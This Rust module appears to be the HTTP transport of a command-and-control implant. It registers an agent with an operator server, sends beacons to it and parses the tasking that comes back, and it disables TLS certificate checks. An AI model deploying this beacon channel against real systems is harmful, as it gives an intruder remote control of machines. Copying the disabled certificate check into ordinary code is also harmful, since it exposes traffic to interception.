use anyhow::Result;
use oxide_common::protocol::{AgentBeacon, AgentRegister, BeaconResponse};
use reqwest::Client;
use uuid::Uuid;

pub struct HttpTransport {
    client:   Client,
    base_url: String,
    agent_id: Uuid,
}

impl HttpTransport {
    pub fn new(host: &str, port: u16, tls: bool, agent_id: Uuid) -> Self {
        let scheme = if tls { "https" } else { "http" };
        let base_url = format!("{scheme}://{host}:{port}");
        let client = Client::builder()
            .danger_accept_invalid_certs(true) // operator CA not in system store
            .timeout(std::time::Duration::from_secs(30))
            .build()
            .expect("http client");
        HttpTransport { client, base_url, agent_id }
    }

    pub async fn register(&self, reg: &AgentRegister) -> Result<()> {
        let url = format!("{}/register", self.base_url);
        crate::dbg_log!("HTTP POST {url}");
        let resp = self.client
            .post(&url)
            .json(reg)
            .send()
            .await;
        match &resp {
            Ok(r) => crate::dbg_log!("HTTP register response: status={}", r.status()),
            Err(e) => crate::dbg_log!("HTTP register FAILED: {e}"),
        }
        resp?.error_for_status()?;
        Ok(())
    }

    pub async fn beacon(&self, b: &AgentBeacon) -> Result<BeaconResponse> {
        let url = format!("{}/beacon/{}", self.base_url, self.agent_id);
        crate::dbg_log!("HTTP POST {url}");
        let resp = self.client
            .post(&url)
            .json(b)
            .send()
            .await;
        match &resp {
            Ok(r) => crate::dbg_log!("HTTP beacon response: status={}", r.status()),
            Err(e) => crate::dbg_log!("HTTP beacon FAILED: {e}"),
        }
        let r = resp?.error_for_status()?;
        Ok(r.json().await?)
    }
}
